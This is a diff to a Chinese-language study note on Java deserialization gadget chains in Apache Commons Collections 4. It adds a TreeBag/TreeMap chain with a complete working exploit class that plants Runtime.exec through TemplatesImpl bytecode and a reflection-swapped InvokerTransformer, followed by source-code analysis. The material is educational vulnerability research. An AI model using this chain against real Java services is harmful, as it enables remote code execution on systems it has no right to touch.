@@ -827,7 +827,9 @@ ps：我们在TransformerMap链中提到了构造AnnotationInvocationHandler实�
 
 commons-collections4 4.0
 
-### Exp展示
+### PriorityQueue链
+
+#### Exp展示
 
 commons-collections4 4.0中，LazyMap和TransformedMap没有了decorate方法，因此CommonCollections1中的利用链无法使用，需要另找别的利用链。
 
@@ -892,9 +894,9 @@ public class CommomsCollections2 {
 }
 ```
 
-### Exp构造分析
+#### Exp构造分析
 
-#### 利用链展示
+##### 利用链展示
 
 ```java
 Gadget chain:
@@ -907,7 +909,7 @@ Gadget chain:
 								Runtime.exec()
 ```
 
-#### InvokerTransformer
+##### InvokerTransformer
 
 ```java
 // org. apache. commons. collections. functors. InvokerTransformer
@@ -963,7 +965,7 @@ Gadget chain:
 
 接下来分析其中原理。
 
-#### TemplatesImpl
+##### TemplatesImpl
 
 ```java
     private String _name = null;
@@ -1129,7 +1131,7 @@ a：因为getTransletInstance是私有方法
 
 ‍
 
-#### TransformingComparator
+##### TransformingComparator
 
 ```java
     /** The decorated comparator. */
@@ -1159,7 +1161,7 @@ commons-collections4 4.0中，LazyMap和TransformedMap没有了decorate方法，
 
 在构造时，transformer传入的应该是InvokerTransformer实例。
 
-#### PriorityQueue
+##### PriorityQueue
 
 ```java
     private final Comparator<? super E> comparator;
@@ -1260,9 +1262,9 @@ commons-collections4 4.0中，LazyMap和TransformedMap没有了decorate方法，
     field3.set(queue,new Object[]{templatesImpl,templatesImpl});//设置queue的queue字段内容Object数组，内容为templatesImpl
 ```
 
-### 问题补充
+#### 问题补充
 
-#### queue占位
+##### queue占位
 
 Q1：
 
@@ -1333,7 +1335,7 @@ A2:
 
 Java并不会检查是否合法，而在反序列化时，由于payload执行早于排序，因此不影响。
 
-#### quenue反序列化
+##### quenue反序列化
 
 Q：
 
@@ -1342,6 +1344,276 @@ PriorityQueue的queue已经使用transient关键字修饰，为什么还能从�
 A：
 
 [序列化规范](https://docs.oracle.com/javase/8/docs/platform/serialization/spec/output.html#a861 "序列化规范")允许待序列化的类实现writeObject方法，实现对自己的成员控制权。
+
+### TreeBag&TreeMap链
+
+#### Exp展示
+
+```java
+import javassist.ClassPool;
+import javassist.CtClass;
+import org.apache.commons.collections4.bag.TreeBag;
+import org.apache.commons.collections4.comparators.TransformingComparator;
+import org.apache.commons.collections4.functors.InvokerTransformer;
+
+import java.io.FileInputStream;
+import java.io.FileOutputStream;
+import java.io.ObjectInputStream;
+import java.io.ObjectOutputStream;
+import java.lang.reflect.Field;
+import java.util.PriorityQueue;
+
+public class CommonsCollections2T {
+    public static void main(String[] args) throws Exception {
+        String AbstractTranslet="com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet";
+        String TemplatesImpl="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
+
+        ClassPool classPool=ClassPool.getDefault();//返回默认的类池
+        classPool.appendClassPath(AbstractTranslet);//添加AbstractTranslet的搜索路径
+        CtClass payload=classPool.makeClass("CommonsCollections22222222222");//创建一个新的public类
+        payload.setSuperclass(classPool.get(AbstractTranslet));  //设置前面创建的CommonsCollections22222222222类的父类为AbstractTranslet
+        payload.makeClassInitializer().setBody("java.lang.Runtime.getRuntime().exec(\"calc\");"); //创建一个空的类初始化，设置构造函数主体为runtime
+
+        byte[] bytes=payload.toBytecode();//转换为byte数组
+
+        Object templatesImpl=Class.forName(TemplatesImpl).getDeclaredConstructor(new Class[]{}).newInstance();//反射创建TemplatesImpl
+        Field field=templatesImpl.getClass().getDeclaredField("_bytecodes");//反射获取templatesImpl的_bytecodes字段
+        field.setAccessible(true);//暴力反射
+        field.set(templatesImpl,new byte[][]{bytes});//将templatesImpl上的_bytecodes字段设置为runtime的byte数组
+
+        Field field1=templatesImpl.getClass().getDeclaredField("_name");//反射获取templatesImpl的_name字段
+        field1.setAccessible(true);//暴力反射
+        field1.set(templatesImpl,"test");//将templatesImpl上的_name字段设置为test
+
+        InvokerTransformer transformer=new InvokerTransformer("toString",new Class[]{},new Object[]{});
+        TransformingComparator comparator =new TransformingComparator(transformer);//使用TransformingComparator修饰器传入transformer对象
+
+        TreeBag tb = new TreeBag(comparator);
+        tb.add(templatesImpl);
+
+        Field field2 = InvokerTransformer.class.getDeclaredField("iMethodName");
+        field2.setAccessible(true);
+        field2.set(transformer, "newTransformer");
+
+        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("test.out"));
+        outputStream.writeObject(tb);
+        outputStream.close();
+
+        ObjectInputStream inputStream=new ObjectInputStream(new FileInputStream("test.out"));
+        inputStream.readObject();
+    }
+}
+
+```
+
+#### Exp构造分析
+
+##### 利用链展示
+
+```java
+Gadget chain:
+		ObjectInputStream.readObject()
+			TreeBag.readObject()
+				...
+					TransformingComparator.compare()
+						InvokerTransformer.transform()
+							Method.invoke()
+								Runtime.exec()
+```
+
+主要分析一下TreeBag和PriorityQueue的不同。
+
+##### TreeBag
+
+```java
+    public TreeBag(Comparator<? super E> comparator) {
+        super(new TreeMap(comparator));//1
+    }
+
+    private void readObject(ObjectInputStream in) throws IOException, ClassNotFoundException {
+        in.defaultReadObject();
+        Comparator<? super E> comp = (Comparator)in.readObject();
+        super.doReadObject(new TreeMap(comp), in);//2
+    }
+```
+
+如注释1处所示，TreeBag创建实例时，还会创建一个TreeMap实例，并且它的排序方法由我们定义。
+
+因此我们可以在Exp中创建TreeBag传入我们的恶意排序方法。
+
+如注释2处所示，TreeBag在反序列化时，我们构造的恶意排序方法同样也反序列化了。
+
+接着我们跟进一下注释2处的代码，AbstractMapBag.doReadObject()。
+
+##### AbstractMapBag
+
+```java
+    protected void doReadObject(Map<E, MutableInteger> map, ObjectInputStream in) throws IOException, ClassNotFoundException {
+        this.map = map;
+        int entrySize = in.readInt();
+
+        for(int i = 0; i < entrySize; ++i) {
+            E obj = in.readObject();
+            int count = in.readInt();
+            map.put(obj, new MutableInteger(count));//1
+            this.size += count;
+        }
+
+    }
+```
+
+程序在注释1处执行了TreeMap.put()，我们看一下对应方法。
+
+##### TreeMap
+
+```java
+    public V put(K key, V value) {
+        Entry<K,V> t = root;
+        if (t == null) {
+            compare(key, key); // type (and possibly null) check
+
+            root = new Entry<>(key, value, null);
+            size = 1;
+            modCount++;
+            return null;
+        }
+        int cmp;
+        Entry<K,V> parent;
+        // split comparator and comparable paths
+        Comparator<? super K> cpr = comparator;
+        if (cpr != null) {
+            do {
+                parent = t;
+                cmp = cpr.compare(key, t.key);
+                if (cmp < 0)
+                    t = t.left;
+                else if (cmp > 0)
+                    t = t.right;
+                else
+                    return t.setValue(value);
+            } while (t != null);
+        }
+        else {
+            if (key == null)
+                throw new NullPointerException();
+            @SuppressWarnings("unchecked")
+                Comparable<? super K> k = (Comparable<? super K>) key;
+            do {
+                parent = t;
+                cmp = k.compareTo(t.key);
+                if (cmp < 0)
+                    t = t.left;
+                else if (cmp > 0)
+                    t = t.right;
+                else
+                    return t.setValue(value);
+            } while (t != null);
+        }
+        Entry<K,V> e = new Entry<>(key, value, parent);
+        if (cmp < 0)
+            parent.left = e;
+        else
+            parent.right = e;
+        fixAfterInsertion(e);
+        size++;
+        modCount++;
+        return null;
+    }
+```
+
+可以看到这里触发了我们构造的恶意排序方法。
+
+后面的流程则和PriorityQueue链相同，不再赘述。
+
+#### 问题补充
+
+##### 用toString初始化
+
+Q：
+
+为什么Exp中的`InvokerTransformer transformer=new InvokerTransformer("toString",new Class[]{},new Object[]{});`​不直接用`InvokerTransformer transformer=new InvokerTransformer("newTransformer",new Class[]{},new Object[]{});`​呢？
+
+A：
+
+我们构造的恶意排序方法其实是不能正常排序的，如果用newTransformer作为入参构造，则在Exp的`tb.add(templatesImpl)`​就会报错，原因看源码：
+
+```java
+    //TreeBag源码
+	public boolean add(E object) {
+        if (this.comparator() == null && !(object instanceof Comparable)) {
+            throw new IllegalArgumentException("Objects of type " + object.getClass() + " cannot be added to " + "a naturally ordered TreeBag as it does not implement Comparable");
+        } else {
+            return super.add(object);
+        }
+    }
+
+	//AbstractTreeBag源码
+    public boolean add(E object) {
+        return this.add(object, 1);
+    }
+
+    public boolean add(E object, int nCopies) {
+        ++this.modCount;
+        if (nCopies > 0) {
+            MutableInteger mut = (MutableInteger)this.map.get(object);
+            this.size += nCopies;
+            if (mut == null) {
+                this.map.put(object, new MutableInteger(nCopies));
+                return true;
+            } else {
+                mut.value += nCopies;
+                return false;
+            }
+        } else {
+            return false;
+        }
+    }
+```
+
+又源码可知，`tb.add(templatesImpl)`​会触发我们的恶意排序，如果用newTransformer作为入参构造，则此处报错。
+
+因此先使用toString作为入参构造，使代码运行通过`tb.add(templatesImpl)`​，后面再通过反射把toString改为newTransformer。
+
+##### newTransformer构造报错原因
+
+```java
+    //TemplatesImpl源码
+	private Translet getTransletInstance()
+        throws TransformerConfigurationException {
+        try {
+            if (_name == null) return null;
+
+            if (_class == null) defineTransletClasses();
+
+            // The translet needs to keep a reference to all its auxiliary
+            // class to prevent the GC from collecting them
+            AbstractTranslet translet = (AbstractTranslet) _class[_transletIndex].newInstance();//1
+            translet.postInitialization();//2
+            translet.setTemplates(this);
+            translet.setOverrideDefaultParser(_overrideDefaultParser);
+            translet.setAllowedProtocols(_accessExternalStylesheet);
+            if (_auxClasses != null) {
+                translet.setAuxiliaryClasses(_auxClasses);
+            }
+
+            return translet;
+        }
+        catch (InstantiationException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+        catch (IllegalAccessException e) {
+            ErrorMsg err = new ErrorMsg(ErrorMsg.TRANSLET_OBJECT_ERR, _name);
+            throw new TransformerConfigurationException(err.toString());
+        }
+    }
+```
+
+程序在执行到注释1处时，触发了我们的恶意代码。
+
+而在注释2处发生了空指针报错：
+
+​![image](http://127.0.0.1:12693/assets/image-20241009180356-d2mxbfz.png)​
 
 ## CommonsCollections3
 
@@ -1531,7 +1803,7 @@ public class CommonsCollections4 {
                 new InstantiateTransformer(
                         new Class[]{Templates.class},
                         new Object[]{templates})
-        };
+        };// 主要是这里的变化
         ChainedTransformer chain = new ChainedTransformer(trans);
         TransformingComparator transCom = new TransformingComparator(chain);
         PriorityQueue queue = new PriorityQueue(2);
